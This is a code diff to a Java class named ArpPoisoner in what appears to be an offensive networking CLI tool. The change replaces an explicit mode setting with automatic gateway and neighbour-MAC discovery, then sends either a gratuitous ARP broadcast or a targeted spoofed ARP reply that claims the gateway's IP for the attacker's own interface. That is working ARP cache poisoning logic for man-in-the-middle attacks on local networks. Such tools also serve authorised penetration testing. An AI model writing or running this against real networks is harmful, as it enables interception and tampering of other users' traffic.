@@ -1,6 +1,8 @@
 package io.gl4dius.cli.module.arp;
 
-import io.gl4dius.cli.assets.PoisoningMode;
+import io.gl4dius.cli.exception.GatewayDetectionException;
+import io.gl4dius.cli.exception.NeighborMacResolutionException;
+import io.gl4dius.cli.service.NetDiscoveryService;
 import io.gl4dius.cli.utility.NetInterfaceUtil;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
@@ -12,19 +14,22 @@ import org.springframework.stereotype.Component;
 public class ArpPoisoner {
 
     private final ArpSender arpSender;
+    private final NetDiscoveryService netDiscoveryService;
 
-    public void poison(String nicName, PoisoningMode poisoningMode, String spoofIp, String targetIp, String targetMac) {
+    public void poison(String nicName, String spoofIp, String targetIp, String targetMac) {
         try {
-            if (poisoningMode != PoisoningMode.TARGET_SPECIFIC && (targetIp != null || targetMac != null)) {
-                throw new IllegalArgumentException("Target IP/MAC can only be used in TS mode");
+            if (spoofIp == null) {
+                spoofIp = this.netDiscoveryService.findDefaultGateway(nicName)
+                        .orElseThrow(() -> new GatewayDetectionException("Automatic NetDiscovery couldn't find NIC gateway IP as default spoofIp parameter, you need to insert it manually"));
             }
 
-            if (poisoningMode == PoisoningMode.TARGET_SPECIFIC && (targetIp == null || targetMac == null)) {
-                throw new IllegalArgumentException("Target IP/MAC is required in TS mode");
+            if (targetIp != null) {
+                targetMac = this.netDiscoveryService.resolveNeighborMacAddress(nicName, targetIp)
+                        .orElseThrow(() -> new NeighborMacResolutionException("Automatic NetDiscovery couldn't find target MAC address, you need to insert it manually"));
             }
 
             var nic = NetInterfaceUtil.findInterface(nicName);
-            if (poisoningMode == PoisoningMode.BROADCAST) {
+            if (targetIp == null) {
                 this.arpSender.sendGratuitousArp(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString());
             } else {
                 this.arpSender.sendArpReply(nicName, spoofIp, NetInterfaceUtil.resolveMac(nic).toString(), targetIp, targetMac);
